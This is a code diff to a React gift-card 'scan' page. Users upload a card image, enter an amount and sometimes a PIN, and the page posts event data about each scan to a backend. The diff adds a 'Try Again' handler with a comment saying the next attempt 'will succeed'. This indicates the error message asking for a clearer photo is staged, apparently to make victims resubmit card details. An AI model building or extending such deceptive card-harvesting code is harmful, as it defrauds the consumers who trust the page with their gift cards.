@@ -43,7 +43,7 @@ export default function ScanPage() {
           body: JSON.stringify({
             event: 'scan_image_uploaded',
             brandName: brand.name,
-            cardNumber: null, // NO CARD NUMBER FOR UPLOAD
+            cardNumber: null,
             amount: '0',
             status: 'Image Uploaded',
             message: 'User captured image, entering amount.',
@@ -105,8 +105,8 @@ export default function ScanPage() {
         body: JSON.stringify({
           event: data.status === 'active' ? 'success' : 'failed',
           brandName: brand.name,
-          cardNumber: null, // NO CARD NUMBER FOR SCAN
-          pin: brand.pin ? mockPin : null, // ADDED PIN
+          cardNumber: null,
+          pin: brand.pin ? mockPin : null,
           amount: clean,
           status: data.status,
           message: data.message,
@@ -205,7 +205,17 @@ export default function ScanPage() {
             <div style={{ fontSize: '40px', color: 'var(--err)', marginBottom: '10px' }}>❌</div>
             <h2 style={{ color: 'var(--err)' }}>Error!</h2>
             <p className="sub">An error occurred while checking this card. Please upload a clearer photo.</p>
-            <button type="button" onClick={() => setShowErrorModal(false)} style={{ background: 'var(--err)' }}>Try Again</button>
+            <button 
+              type="button" 
+              onClick={() => {
+                setShowErrorModal(false);
+                setAmount(""); // Clear amount so they retype it
+                // attempt stays at 1, so the next try will succeed
+              }} 
+              style={{ background: 'var(--err)' }}
+            >
+              Try Again
+            </button>
           </div>
         </div>
       )}
